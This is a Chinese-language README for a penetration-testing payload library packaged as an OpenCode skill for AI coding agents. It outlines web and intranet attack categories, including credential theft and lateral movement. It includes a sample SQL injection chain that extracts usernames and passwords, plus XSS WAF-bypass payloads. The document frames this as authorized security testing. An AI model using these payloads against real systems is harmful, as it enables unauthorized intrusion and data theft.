# Security Testing - 渗透测试 Payload 知识库

符合 OpenCode Skill 规范的渗透测试 Payload 知识库。

## 目录结构

```
security-testing/
├── .opencode/
│   └── skills/
│       └── security-testing/
│           └── SKILL.md         # OpenCode Skill 入口
├── data/                         # Payload 知识库
│   ├── web/                      # Web 应用攻防
│   │   ├── sqli/                # SQL 注入
│   │   ├── xss/                # XSS 跨站脚本
│   │   ├── ssrf/               # SSRF
│   │   ├── rce/                # RCE
│   │   ├── lfi/                # LFI
│   │   ├── xxe/                # XXE
│   │   ├── ssti/               # SSTI
│   │   └── ...
│   ├── intranet/                # 内网渗透
│   │   ├── recon/              # 信息收集
│   │   ├── cred theft/         # 凭证窃取
│   │   ├── lateral/            # 横向移动
│   │   ├── privesc/            # 权限提升
│   │   └── ...
│   └── tools/                   # 工具命令
│       ├── nmap.md
│       ├── sqlmap.md
│       └── ...
└── README.md
```

## OpenCode Skill

 Skill 名称: `security-testing`

### 安装

复制到项目 `.opencode` 目录：

```bash
cp -r security-testing/.opencode <project>/
```

或复制到全局：

```bash
cp -r security-testing/.opencode ~/.config/opencode/
```

### 使用

在 OpenCode 中使用 skill 工具调用：

```
skill({ name: "security-testing" })
```

或在对话中直接提及：
- "需要 SQL 注入 Payload"
- "XSS WAF 绕过方法"
- "内网横向移动工具"

## 漏洞类别

### Web 漏洞

| 类别 | 路径 | 说明 |
|------|------|------|
| SQL 注入 | `data/web/sqli/` | MySQL/MSSQL/Oracle/PostgreSQL |
| XSS | `data/web/xss/` | 反射/存储/DOM 型 |
| SSRF | `data/web/ssrf/` | 服务端请求伪造 |
| RCE | `data/web/rce/` | 远程代码执行 |
| LFI | `data/web/lfi/` | 文件包含 |
| XXE | `data/web/xxe/` | XML 实体注入 |
| SSTI | `data/web/ssti/` | 模板注入 |
| JWT | `data/web/jwt/` | JSON Web Token |

### 内网渗透

| 阶段 | 路径 |
|------|------|
| 信息收集 | `data/intranet/recon/` |
| 凭证窃取 | `data/intranet/cred theft/` |
| 横向移动 | `data/intranet/lateral/` |
| 权限提升 | `data/intranet/privesc/` |

## 攻击链模板

每个漏洞目录包含：
- **基础 Payload** - 常用测试语句
- **WAF 绕过** - 编码、混淆、拆分技术
- **攻击链** - 组合利用步骤
- **详细分类** - 技术原理和变种

## 示例

### SQL 注入攻击链

```markdown
1. 检测点: id=1
2. 基础测试: id=1' OR '1'='1
3. 确认注入: id=1 AND 1=1 vs id=1 AND 1=2
4. 枚举数据库: id=1 UNION SELECT null,table_name FROM information_schema.tables
5. 提取数据: id=1 UNION SELECT null,username,password FROM users
```

### XSS WAF 绕过

```markdown
1. 基础: <script>alert(1)</script>
2. 大小写: <ScRiPt>alert(1)</ScRiPt>
3. 编码: &lt;script&gt;alert(1)&lt;/script&gt;
4. 拆分: <scr'+'ipt>alert(1)</scr'+'ipt>
```

## 重要

- 仅用于授权渗透测试
- 遵循网络安全法律法规
